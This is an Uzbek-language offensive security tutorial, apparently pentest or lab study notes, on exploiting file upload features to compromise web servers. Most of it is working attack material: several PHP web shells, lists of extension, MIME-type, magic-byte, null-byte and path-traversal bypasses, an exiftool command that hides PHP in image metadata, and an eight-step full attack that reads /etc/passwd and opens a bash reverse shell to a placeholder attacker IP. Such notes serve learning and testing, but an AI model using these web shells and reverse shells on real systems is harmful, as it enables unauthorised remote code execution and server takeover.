# 📤 Upload Vulnerabilities (Fayl Yuklash Zaifliklari)

> **Maqsad:** Veb-saytlardagi fayl yuklash funksiyasidagi zaifliklardan foydalanib, serverni buzish.

---

## 📖 Upload Vulnerability nima?

Sayt foydalanuvchiga fayl yuklash imkonini beradi (rasm, hujjat). Agar bu funksiya noto'g'ri himoyalangan bo'lsa, hujumchi zararli fayl — **web shell** yuklab, serverda buyruq ishlatishi mumkin.

```
Normal: user.jpg yuklanadi → /uploads/user.jpg ko'rsatiladi
Hujum:  shell.php yuklanadi → /uploads/shell.php?cmd=id ishlaydi
```

---

## 🐚 Web Shell nima?

**Web Shell** — serverda buyruq ishlatish imkonini beruvchi zararli skript.

```php
# Oddiy PHP web shell:
<?php system($_GET['cmd']); ?>

# Ishlatish:
http://target.com/uploads/shell.php?cmd=id
http://target.com/uploads/shell.php?cmd=whoami
http://target.com/uploads/shell.php?cmd=cat+/etc/passwd
```

---

## 🚫 Himoya Usullari va Ularni Bypass Qilish

### 1. Kengaytma Filtri (Extension Filter)

#### Qora ro'yxat (Blacklist) — Zaif:
```
Bloklangan: .php, .py, .sh

# Bypass usullari:
shell.php3      # Eski PHP
shell.php4
shell.php5
shell.phtml
shell.phar
shell.php.jpg   # Ikki kengaytma
shell.PhP       # Katta/kichik harf
shell.php%00    # Null byte (eski serverlar)
shell.php%20    # Bo'sh joy
shell.php.      # Nuqta bilan
```

#### Oq ro'yxat (Whitelist) — Kuchli:
```
Faqat: .jpg, .png, .gif

# Bypass (qiyinroq):
shell.php%00.jpg    # Null byte — server .jpg ko'radi, PHP .php ishlaydi
shell.php.jpg       # Agar server kengaytmani noto'g'ri tekshirsa
```

---

### 2. MIME Type Filtri (Content-Type)

Brauzer fayl turini `Content-Type` header orqali yuboradi.

```
Normal rasm: Content-Type: image/jpeg
PHP fayl:    Content-Type: application/x-php  ← Bloklangan!
```

**Bypass — Burp Suite bilan:**
```http
# Asl so'rov:
POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php   ← O'zgartiring!

# O'zgartirilgan:
Content-Type: image/jpeg           ← Rasm deb ko'radi → o'tadi!

<?php system($_GET['cmd']); ?>
```

---

### 3. Magic Bytes (Fayl Imzosi)

Har bir fayl turi boshida maxsus baytlar bo'ladi. Server faqat shu baytlarni tekshiradi.

```
JPEG: FF D8 FF E0  (ÿØÿà)
PNG:  89 50 4E 47  (‰PNG)
GIF:  47 49 46 38  (GIF8)
PDF:  25 50 44 46  (%PDF)
```

**Bypass — Magic bytes + PHP:**
```
# Shell faylining boshiga rasm baytlarini qo'shish:
GIF89a;
<?php system($_GET['cmd']); ?>

# Yoki hexeditor bilan:
FF D8 FF E0  + PHP kodi
```

**Burp Suite bilan:**
```
Fayl tanlang → Burp Intercept → Body boshiga GIF89a; qo'shing
```

---

### 4. Fayl Mazmunini Tekshirish (Content Validation)

Server faylni to'liq tahlil qiladi. Eng kuchli himoya.

```
# Bypass (qiyinroq):
# Haqiqiy rasm faylga PHP kodi steganografiya bilan kiritish:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg.php
```

---

## 📁 Yuklangan Faylni Topish

```bash
# Standart yuklash joylari:
/uploads/
/upload/
/files/
/media/
/images/
/static/uploads/
/assets/uploads/
/content/uploads/   # WordPress
/wp-content/uploads/

# gobuster bilan topish:
gobuster dir -u http://target.com/uploads -w wordlist.txt -x php,jpg,png
```

---

## 🔄 Path Traversal + Upload

```
# Fayl nomi orqali path traversal:
filename="../../shell.php"
→ /uploads/../../shell.php → /shell.php (root da!)

# Burp Suite bilan:
Content-Disposition: form-data; name="file"; filename="../../shell.php"
```

---

## 🎯 Amaliy Misol: To'liq Hujum

```
# 1-qadam: Upload funksiyasini toping
http://target.com/upload
# Rasm yuklang → ishlaydi

# 2-qadam: Shell tayyorlang
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 3-qadam: Kengaytma filtri bormi?
shell.php → Bloklandi!
shell.php5 → O'tdi? → Davom eting!
shell.phtml → O'tdi?

# 4-qadam: MIME type filtri bormi?
Burp Intercept → Content-Type: image/jpeg ga o'zgartiring

# 5-qadam: Magic bytes qo'shing (zarur bo'lsa)
GIF89a;<?php system($_GET["cmd"]); ?>

# 6-qadam: Yuklangan joyni toping
/uploads/shell.php5

# 7-qadam: Shell ni ishlatish
http://target.com/uploads/shell.php5?cmd=id
http://target.com/uploads/shell.php5?cmd=whoami
http://target.com/uploads/shell.php5?cmd=cat+/etc/passwd

# 8-qadam: Reverse shell (opsional)
# Tinglovchi:
nc -lvnp 4444

# cmd parametri:
cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'
```

---

## 🔧 Foydali Web Shell lar

```php
# Oddiy:
<?php system($_GET['cmd']); ?>

# Ko'proq funksiya:
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo `{$_GET['cmd']}`; ?>

# Keng qamrovli (b374k, c99, r57):
# GitHub da topish mumkin — pentest laboratoriyasi uchun
```

---

## 💡 Eslab Qolish Uchun

| Himoya | Bypass usuli |
|--------|-------------|
| Kengaytma blacklist | `.php5`, `.phtml`, `.phar` |
| MIME type filtri | Burp bilan `Content-Type: image/jpeg` |
| Magic bytes | Faylga `GIF89a;` qo'shish |
| Fayl nomi | Path traversal `../../shell.php` |

**Tezkor eslatma:**
- Web shell = Serverda kod ishlatish
- `GIF89a;` + PHP = Magic bytes bypass
- `Content-Type: image/jpeg` = MIME bypass
- `/uploads/` → Shell yuklangandan keyin shu yerda
- Null byte `%00` = Eski serverlar uchun bypass
- Kengaytmalar: `.php3`, `.php5`, `.phtml`, `.phar`
